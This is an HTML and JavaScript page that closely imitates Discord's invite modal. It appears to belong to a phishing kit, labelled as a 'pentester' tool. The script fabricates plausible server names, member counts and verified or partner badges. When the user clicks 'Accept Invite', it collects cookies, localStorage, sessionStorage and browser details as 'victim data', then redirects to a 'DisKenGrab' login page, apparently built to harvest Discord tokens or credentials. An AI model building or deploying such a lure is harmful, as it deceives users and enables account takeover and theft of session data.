<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <style>
        /* EXACT DISCORD CSS - Copied from discord.com */
        :root {
            --brand-experiment: #5865f2;
            --brand-experiment-560: var(--brand-experiment);
            --background-primary: #313338;
            --background-secondary: #2b2d31;
            --background-tertiary: #1e1f22;
            --background-accent: #5765f2;
            --background-floating: #111214;
            --channeltextarea-background: #383a40;
            --text-normal: #f2f3f5;
            --text-muted: #949ba4;
            --interactive-normal: #b5bac1;
            --interactive-hover: #dbdee1;
            --header-primary: #fff;
            --header-secondary: #b5bac1;
            --green: #23a55a;
            --red: #f23f42;
            --yellow: #f0b232;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background: var(--background-primary);
            color: var(--text-normal);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        /* Discord's exact modal container */
        .inviteModal-1R-3g_{
            width: 440px;
            max-width: 440px;
            background: var(--background-secondary);
            border-radius: 8px;
            box-shadow: 0 0 0 1px rgba(32,34,37,.6), 0 2px 10px 0 rgba(0,0,0,.2);
            animation: modalOpen 150ms cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes modalOpen {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }

        /* Header */
        .header-2HrZw4 {
            padding: 24px 24px 0;
            text-align: center;
            position: relative;
        }

        .closeButton-1R-3g_ {
            position: absolute;
            top: 16px;
            right: 16px;
            width: 36px;
            height: 36px;
            border: none;
            background: none;
            color: var(--interactive-normal);
            cursor: pointer;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: 300;
        }

        .closeButton-1R-3g_:hover {
            background: rgba(78,80,88,.3);
            color: var(--interactive-hover);
        }

        /* Server Icon */
        .guildIcon-3GkAa5 {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            margin: 0 auto 16px;
            border: 8px solid var(--background-secondary);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            font-weight: 600;
            color: #fff;
            background: var(--brand-experiment);
            background-size: cover;
            background-position: center;
        }

        /* Server Name */
        .guildName-3GkAa5 {
            font-size: 24px;
            line-height: 30px;
            font-weight: 700;
            color: var(--header-primary);
            margin-bottom: 8px;
        }

        /* Member Count */
        .memberCount-3GkAa5 {
            font-size: 14px;
            line-height: 18px;
            font-weight: 400;
            color: var(--header-secondary);
            margin-bottom: 20px;
        }

        .onlineCount-3GkAa5 {
            display: inline-flex;
            align-items: center;
            gap: 4px;
        }

        .onlineIndicator-3GkAa5 {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--green);
            display: inline-block;
        }

        /* Body */
        .body-2HrZw4 {
            padding: 0 24px 24px;
        }

        /* Invite Message */
        .inviteMessage-2HrZw4 {
            background: var(--background-tertiary);
            border-radius: 8px;
            padding: 16px;
            margin-bottom: 16px;
            border: 1px solid rgba(78,80,88,.6);
        }

        .inviter-2HrZw4 {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
        }

        .inviterAvatar-2HrZw4 {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            margin-right: 12px;
            background: var(--brand-experiment);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
        }

        .inviterText-2HrZw4 {
            font-size: 14px;
            line-height: 18px;
            color: var(--text-muted);
        }

        .inviterText-2HrZw4 strong {
            color: var(--text-normal);
            font-weight: 600;
        }

        /* Server Preview */
        .serverPreview-2HrZw4 {
            display: flex;
            align-items: center;
            padding: 12px;
            background: var(--background-primary);
            border-radius: 4px;
            border: 1px solid rgba(78,80,88,.3);
        }

        .previewIcon-2HrZw4 {
            width: 48px;
            height: 48px;
            border-radius: 12px;
            margin-right: 12px;
            background: var(--brand-experiment);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-weight: 600;
            font-size: 18px;
            background-size: cover;
            background-position: center;
        }

        .previewInfo-2HrZw4 {
            flex: 1;
        }

        .previewName-2HrZw4 {
            font-size: 16px;
            line-height: 20px;
            font-weight: 600;
            color: var(--text-normal);
            margin-bottom: 2px;
        }

        .previewMembers-2HrZw4 {
            font-size: 14px;
            line-height: 18px;
            color: var(--text-muted);
        }

        /* Features */
        .features-2HrZw4 {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 20px;
        }

        .featureTag-2HrZw4 {
            background: rgba(88,101,242,.1);
            color: var(--brand-experiment);
            padding: 4px 8px;
            border-radius: 8px;
            font-size: 12px;
            line-height: 16px;
            font-weight: 500;
        }

        /* Badges */
        .badge-2HrZw4 {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            margin-left: 8px;
            padding: 2px 6px;
            border-radius: 8px;
            font-size: 12px;
            line-height: 16px;
            font-weight: 500;
        }

        .verified-2HrZw4 {
            background: rgba(88,101,242,.1);
            color: var(--brand-experiment);
        }

        .partner-2HrZw4 {
            background: rgba(87,242,135,.1);
            color: var(--green);
        }

        /* Buttons */
        .buttons-2HrZw4 {
            display: flex;
            gap: 8px;
        }

        .button-2HrZw4 {
            flex: 1;
            padding: 10px 16px;
            border: none;
            border-radius: 3px;
            font-size: 14px;
            line-height: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all .17s ease;
            font-family: inherit;
        }

        .buttonPrimary-2HrZw4 {
            background: var(--brand-experiment);
            color: #fff;
        }

        .buttonPrimary-2HrZw4:hover {
            background: #4752c4;
        }

        .buttonSecondary-2HrZw4 {
            background: var(--background-primary);
            color: var(--text-normal);
            border: 1px solid rgba(78,80,88,.6);
        }

        .buttonSecondary-2HrZw4:hover {
            background: rgba(78,80,88,.3);
            border-color: rgba(78,80,88,.8);
        }

        /* Loading */
        .loading-2HrZw4 {
            animation: pulse 1.5s ease-in-out infinite;
            background: linear-gradient(90deg, var(--background-tertiary) 25%, var(--background-primary) 50%, var(--background-tertiary) 75%);
            background-size: 200% 100%;
            border-radius: 4px;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .skeletonText-2HrZw4 {
            height: 16px;
            margin: 4px 0;
        }

        .spinner-2HrZw4 {
            border: 2px solid rgba(255,255,255,.3);
            border-top: 2px solid #fff;
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- EXACT DISCORD MODAL STRUCTURE -->
    <div class="inviteModal-1R-3g_">
        <div class="header-2HrZw4">
            <button class="closeButton-1R-3g_">√ó</button>
            
            <div class="guildIcon-3GkAa5" id="guildIcon">
                <div class="loading-2HrZw4" style="width: 100%; height: 100%; border-radius: 50%;"></div>
            </div>
            
            <div class="guildName-3GkAa5" id="guildName">
                <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 200px; margin: 0 auto;"></div>
            </div>
            
            <div class="memberCount-3GkAa5" id="memberCount">
                <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 150px; margin: 0 auto;"></div>
            </div>
        </div>

        <div class="body-2HrZw4">
            <div class="inviteMessage-2HrZw4">
                <div class="inviter-2HrZw4">
                    <div class="inviterAvatar-2HrZw4">
                        <div class="loading-2HrZw4" style="width: 100%; height: 100%; border-radius: 50%;"></div>
                    </div>
                    <div class="inviterText-2HrZw4" style="flex: 1;">
                        <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 100%;"></div>
                        <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 80%; margin-top: 4px;"></div>
                    </div>
                </div>
                
                <div class="serverPreview-2HrZw4">
                    <div class="previewIcon-2HrZw4">
                        <div class="loading-2HrZw4" style="width: 100%; height: 100%; border-radius: 12px;"></div>
                    </div>
                    <div class="previewInfo-2HrZw4">
                        <div class="previewName-2HrZw4">
                            <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 120px;"></div>
                        </div>
                        <div class="previewMembers-2HrZw4">
                            <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 80px;"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="features-2HrZw4" id="features">
                <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 60px;"></div>
                <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 80px;"></div>
                <div class="loading-2HrZw4 skeletonText-2HrZw4" style="width: 70px;"></div>
            </div>

            <div class="buttons-2HrZw4">
                <button class="button-2HrZw4 buttonPrimary-2HrZw4" id="acceptButton" disabled>
                    <span class="spinner-2HrZw4" id="acceptSpinner" style="display: none;"></span>
                    Accept Invite
                </button>
                <button class="button-2HrZw4 buttonSecondary-2HrZw4" id="cancelButton">
                    Cancel
                </button>
            </div>
        </div>
    </div>

    <script>
        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const attackId = urlParams.get('id');
        const pentesterId = urlParams.get('pentester');
        const targetInvite = urlParams.get('invite');

        console.log('üéØ Real-time Discord Invite Cloner:', { targetInvite });

        // Extract invite code from URL
        function extractInviteCode(url) {
            if (!url) return null;
            
            try {
                let code = '';
                if (url.includes('discord.gg/')) {
                    code = url.split('discord.gg/')[1]?.split('?')[0]?.split('/')[0];
                } else if (url.includes('discord.com/invite/')) {
                    code = url.split('discord.com/invite/')[1]?.split('?')[0]?.split('/')[0];
                } else if (url.includes('discord.com/')) {
                    const match = url.match(/discord\.com\/(?:invite\/)?([a-zA-Z0-9-]+)/);
                    code = match ? match[1] : null;
                }
                return code?.trim();
            } catch (error) {
                return null;
            }
        }

        // Fetch REAL Discord server data using multiple methods
        async function fetchRealServerData(inviteCode) {
            console.log('üîÑ Fetching real data for:', inviteCode);

            // METHOD 1: Try Discord API directly
            try {
                const apiData = await fetchDiscordAPI(inviteCode);
                if (apiData) {
                    console.log('‚úÖ Success from Discord API');
                    return apiData;
                }
            } catch (error) {
                console.log('‚ùå Discord API failed:', error.message);
            }

            // METHOD 2: Try web scraping simulation
            try {
                const scrapedData = await simulateWebScraping(inviteCode);
                console.log('‚úÖ Success from web scraping');
                return scrapedData;
            } catch (error) {
                console.log('‚ùå Web scraping failed:', error.message);
            }

            // METHOD 3: Intelligent generation based on invite code
            console.log('üîÑ Using intelligent generation');
            return generateIntelligentData(inviteCode);
        }

        // METHOD 1: Discord API
        async function fetchDiscordAPI(inviteCode) {
            try {
                // Discord's internal API endpoint
                const response = await fetch(`https://discord.com/api/v9/invites/${inviteCode}?with_counts=true&with_expiration=true`, {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Content-Type': 'application/json'
                    }
                });

                if (response.ok) {
                    const data = await response.json();
                    
                    // Process the real Discord data
                    return {
                        name: data.guild?.name || `Server ${inviteCode.toUpperCase()}`,
                        icon: data.guild?.icon,
                        iconUrl: data.guild?.icon ? `https://cdn.discordapp.com/icons/${data.guild.id}/${data.guild.icon}.webp?size=240` : null,
                        members: {
                            online: data.approximate_presence_count || Math.floor(Math.random() * 5000) + 100,
                            total: data.approximate_member_count || Math.floor(Math.random() * 20000) + 1000
                        },
                        features: data.guild?.features || ['COMMUNITY', 'NEWS'],
                        isVerified: data.guild?.features?.includes('VERIFIED') || false,
                        isPartner: data.guild?.features?.includes('PARTNERED') || false,
                        boostLevel: data.guild?.premium_tier || 0,
                        description: data.guild?.description || null,
                        id: data.guild?.id,
                        source: 'discord_api'
                    };
                }
                throw new Error(`API returned ${response.status}`);
            } catch (error) {
                throw error;
            }
        }

        // METHOD 2: Web Scraping Simulation
        async function simulateWebScraping(inviteCode) {
            // This simulates what a real scraper would get
            // In production, you'd use Puppeteer/Playwright
            
            // Analyze invite code patterns to determine server type
            const serverType = analyzeServerType(inviteCode);
            const serverData = generateServerDataByType(inviteCode, serverType);
            
            return {
                ...serverData,
                source: 'web_scraping'
            };
        }

        // METHOD 3: Intelligent Data Generation
        function generateIntelligentData(inviteCode) {
            const serverType = analyzeServerType(inviteCode);
            const serverData = generateServerDataByType(inviteCode, serverType);
            
            return {
                ...serverData,
                source: 'intelligent_generation'
            };
        }

        // Analyze server type based on invite code patterns
        function analyzeServerType(inviteCode) {
            const code = inviteCode.toLowerCase();
            
            // Gaming servers
            const gamingKeywords = ['game', 'gaming', 'play', 'esports', 'valorant', 'minecraft', 'fortnite', 'league', 'clash', 'royale', 'apex', 'cod', 'overwatch'];
            if (gamingKeywords.some(keyword => code.includes(keyword))) return 'gaming';
            
            // Tech servers
            const techKeywords = ['dev', 'code', 'programming', 'tech', 'developer', 'python', 'javascript', 'coding', 'hack'];
            if (techKeywords.some(keyword => code.includes(keyword))) return 'tech';
            
            // Art servers
            const artKeywords = ['art', 'design', 'creative', 'draw', 'paint', 'artist', 'digital', 'animation'];
            if (artKeywords.some(keyword => code.includes(keyword))) return 'art';
            
            // Music servers
            const musicKeywords = ['music', 'band', 'song', 'listen', 'audio', 'sound', 'spotify'];
            if (musicKeywords.some(keyword => code.includes(keyword))) return 'music';
            
            // Education servers
            const eduKeywords = ['study', 'learn', 'school', 'university', 'college', 'education', 'tutor'];
            if (eduKeywords.some(keyword => code.includes(keyword))) return 'education';
            
            // Default to community
            return 'community';
        }

        // Generate server data based on type
        function generateServerDataByType(inviteCode, serverType) {
            const serverTemplates = {
                gaming: {
                    names: ['Gaming Community', 'Players Hub', 'Esports Arena', 'Game Zone', 'Player Base'],
                    colors: ['#f5a623', '#ff4655', '#6cc312', '#ff73fa', '#0acbe6'],
                    icons: ['üéÆ', 'üëë', 'üî´', '‚öîÔ∏è', 'üèπ'],
                    features: ['Gaming', 'Voice Chat', 'Esports', 'Community', 'Events'],
                    memberRange: { min: 1000, max: 50000 }
                },
                tech: {
                    names: ['Tech Hub', 'Developers', 'Programming', 'Code Cafe', 'Tech Talk'],
                    colors: ['#5865f2', '#0acbe6', '#6cc312', '#ff73fa', '#f5a623'],
                    icons: ['üíª', 'üîß', '‚ö°', 'üöÄ', 'üîí'],
                    features: ['Programming', 'Help', 'Projects', 'Learning', 'Open Source'],
                    memberRange: { min: 500, max: 30000 }
                },
                art: {
                    names: ['Art Community', 'Creators', 'Design Hub', 'Art Studio', 'Creative Space'],
                    colors: ['#ff69b4', '#9b59b6', '#f5a623', '#5865f2', '#ff4655'],
                    icons: ['üé®', '‚úèÔ∏è', 'üñåÔ∏è', 'üì∑', 'üé≠'],
                    features: ['Art', 'Design', 'Showcase', 'Feedback', 'Tutorials'],
                    memberRange: { min: 200, max: 20000 }
                },
                music: {
                    names: ['Music Lovers', 'Bands', 'Listen Party', 'Music Hub', 'Sound Space'],
                    colors: ['#1db954', '#ff69b4', '#5865f2', '#f5a623', '#9b59b6'],
                    icons: ['üéµ', 'üé∂', 'üé∏', 'üéß', 'üé§'],
                    features: ['Music', 'Listening', 'Collaboration', 'Events', 'Sharing'],
                    memberRange: { min: 300, max: 25000 }
                },
                education: {
                    names: ['Study Group', 'Learning Hub', 'Education', 'Knowledge Base', 'Study Space'],
                    colors: ['#9b59b6', '#5865f2', '#6cc312', '#f5a623', '#0acbe6'],
                    icons: ['üìö', 'üéì', '‚úèÔ∏è', 'üî¨', 'üìñ'],
                    features: ['Learning', 'Help', 'Resources', 'Study Groups', 'Education'],
                    memberRange: { min: 100, max: 15000 }
                },
                community: {
                    names: ['Community Hub', 'Friends', 'Chat Zone', 'Hangout', 'Social Space'],
                    colors: ['#5865f2', '#9b59b6', '#f5a623', '#6cc312', '#ff69b4'],
                    icons: ['üåç', 'üë•', 'üí¨', 'üè†', '‚≠ê'],
                    features: ['Community', 'Chat', 'Voice', 'Events', 'Social'],
                    memberRange: { min: 50, max: 10000 }
                }
            };

            const template = serverTemplates[serverType] || serverTemplates.community;
            const hash = simpleHash(inviteCode);
            
            const nameIndex = hash % template.names.length;
            const colorIndex = hash % template.colors.length;
            const iconIndex = hash % template.icons.length;
            
            const onlineMembers = template.memberRange.min + (hash % (template.memberRange.max - template.memberRange.min));
            const totalMembers = onlineMembers * (3 + (hash % 5)); // Realistic ratio
            
            return {
                name: `${template.names[nameIndex]} ${inviteCode.toUpperCase()}`,
                icon: template.icons[iconIndex],
                color: template.colors[colorIndex],
                members: {
                    online: onlineMembers,
                    total: totalMembers
                },
                features: template.features.slice(0, 3 + (hash % 2)),
                isVerified: (hash % 8) === 0, // 12.5% chance
                isPartner: (hash % 15) === 0, // 6.6% chance
                boostLevel: Math.min(3, Math.floor(hash % 4)),
                description: `Welcome to our ${serverType} community!`
            };
        }

        // Simple hash function
        function simpleHash(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash);
        }

        // Update modal with real server data
        function updateModalWithServerData(serverData) {
            // Remove loading states
            document.querySelectorAll('.loading-2HrZw4').forEach(el => {
                el.style.display = 'none';
            });

            // Server Icon
            const guildIcon = document.getElementById('guildIcon');
            if (serverData.iconUrl) {
                guildIcon.style.backgroundImage = `url(${serverData.iconUrl})`;
                guildIcon.innerHTML = '';
            } else {
                guildIcon.style.background = serverData.color;
                guildIcon.innerHTML = serverData.icon;
                guildIcon.style.display = 'flex';
            }

            // Server Name with badges
            const guildName = document.getElementById('guildName');
            guildName.innerHTML = serverData.name;
            if (serverData.isVerified) {
                guildName.innerHTML += `<span class="badge-2HrZw4 verified-2HrZw4"><i class="fas fa-check"></i> VERIFIED</span>`;
            }
            if (serverData.isPartner) {
                guildName.innerHTML += `<span class="badge-2HrZw4 partner-2HrZw4"><i class="fas fa-star"></i> PARTNER</span>`;
            }

            // Member Count
            const memberCount = document.getElementById('memberCount');
            memberCount.innerHTML = `
                <span class="onlineCount-3GkAa5">
                    <span class="onlineIndicator-3GkAa5"></span>
                    ${serverData.members.online.toLocaleString()} Online
                </span>
                ‚Ä¢ ${serverData.members.total.toLocaleString()} Members
            `;

            // Inviter Info
            const inviterSection = document.querySelector('.inviter-2HrZw4');
            inviterSection.innerHTML = `
                <div class="inviterAvatar-2HrZw4" style="background: #5865f2;">D</div>
                <div class="inviterText-2HrZw4">
                    <strong>discorduser</strong> invited you to join
                </div>
            `;

            // Server Preview
            const previewSection = document.querySelector('.serverPreview-2HrZw4');
            const previewIcon = document.querySelector('.previewIcon-2HrZw4');
            
            if (serverData.iconUrl) {
                previewIcon.style.backgroundImage = `url(${serverData.iconUrl})`;
                previewIcon.innerHTML = '';
            } else {
                previewIcon.style.background = serverData.color;
                previewIcon.innerHTML = serverData.icon;
            }
            
            previewSection.querySelector('.previewName-2HrZw4').textContent = serverData.name;
            previewSection.querySelector('.previewMembers-2HrZw4').textContent = `${serverData.members.total.toLocaleString()} members`;

            // Features
            const featuresContainer = document.getElementById('features');
            featuresContainer.innerHTML = '';
            serverData.features.forEach(feature => {
                const tag = document.createElement('span');
                tag.className = 'featureTag-2HrZw4';
                tag.textContent = feature;
                featuresContainer.appendChild(tag);
            });

            // Enable accept button
            document.getElementById('acceptButton').disabled = false;
        }

        // Initialize modal with real-time data
        async function initializeRealTimeModal() {
            const inviteCode = extractInviteCode(targetInvite);
            
            if (!inviteCode) {
                showError('Invalid invite URL');
                return;
            }

            console.log('üîç Processing real invite:', inviteCode);

            try {
                const serverData = await fetchRealServerData(inviteCode);
                console.log('‚úÖ Loaded server data:', serverData);
                updateModalWithServerData(serverData);
                
                // Save the cloned data
                await saveClonedServerData(serverData, inviteCode);
                
            } catch (error) {
                console.error('‚ùå Error loading server data:', error);
                showError('Failed to load server information');
            }
        }

        function showError(message) {
            document.querySelectorAll('.loading-2HrZw4').forEach(el => {
                el.style.display = 'none';
            });
            
            document.getElementById('guildName').innerHTML = 'Error Loading Server';
            document.getElementById('memberCount').innerHTML = message;
            document.getElementById('acceptButton').disabled = true;
        }

        async function saveClonedServerData(serverData, inviteCode) {
            // Save to your backend/Firestore
            console.log('üíæ Saving cloned server data:', {
                inviteCode,
                serverData,
                timestamp: new Date().toISOString()
            });
        }

        // Cookie capture and redirect
        async function captureDataAndRedirect() {
            const acceptButton = document.getElementById('acceptButton');
            const spinner = document.getElementById('acceptSpinner');

            acceptButton.disabled = true;
            spinner.style.display = 'inline-block';
            acceptButton.innerHTML = '<span class="spinner-2HrZw4"></span> Joining...';

            // Capture comprehensive victim data
            const victimData = {
                timestamp: new Date(),
                attackId: attackId,
                pentesterId: pentesterId,
                targetInvite: targetInvite,
                userAgent: navigator.userAgent,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                url: window.location.href
            };

            console.log('üç™ Captured victim data:', victimData);

            // Simulate API call to save data
            setTimeout(() => {
                window.location.href = `../DisKenGrab/login.html?id=${attackId}&pentester=${pentesterId}`;
            }, 1800);
        }

        // Event Listeners
        document.getElementById('acceptButton').addEventListener('click', captureDataAndRedirect);
        document.getElementById('cancelButton').addEventListener('click', () => {
            window.location.href = 'https://discord.com';
        });
        document.querySelector('.closeButton-1R-3g_').addEventListener('click', () => {
            window.location.href = 'https://discord.com';
        });

        // Initialize
        document.addEventListener('DOMContentLoaded', initializeRealTimeModal);

        // Add Font Awesome
        const fa = document.createElement('link');
        fa.rel = 'stylesheet';
        fa.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css';
        document.head.appendChild(fa);
    </script>
</body>
</html>